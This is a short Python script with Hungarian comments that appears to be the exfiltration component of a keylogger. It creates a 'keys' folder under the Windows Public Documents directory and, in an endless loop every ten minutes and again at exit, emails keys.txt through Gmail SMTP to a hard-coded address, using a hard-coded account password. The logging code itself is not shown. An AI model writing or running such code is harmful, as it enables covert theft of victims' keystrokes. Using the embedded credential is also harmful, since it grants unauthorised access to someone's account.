import time
from email.message import EmailMessage
from pathlib import Path
import smtplib
import os
import atexit

print("elindult")

# — nyelvfüggetlen mappakezelés —
public = Path(os.environ["PUBLIC"])
public_docs = public / "Documents"
public_docs.mkdir(parents=True, exist_ok=True)

folder = public_docs / "keys"
folder.mkdir(parents=True, exist_ok=True)

log_file = folder / "keys.txt"

def send_file_via_email(file_path, to_email):
    msg = EmailMessage()
    msg["Subject"] = f"Automated file: {file_path.name}"
    msg["From"] = "spwincome@gmail.com"
    msg["To"] = to_email

    with open(file_path, "rb") as f:
        msg.add_attachment(f.read(),
                           maintype="text",
                           subtype="plain",
                           filename=file_path.name)

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login("spwincome@gmail.com", "zocv svuo rjek smrl")
        server.send_message(msg)

def send_on_exit():
    send_file_via_email(log_file, "spwincome@gmail.com")
atexit.register(send_on_exit) 

# test‑loop:end file every 10 minutes
while True:
    send_file_via_email(log_file, "spwincome@gmail.com")
    time.sleep(600)  # 10 minutes






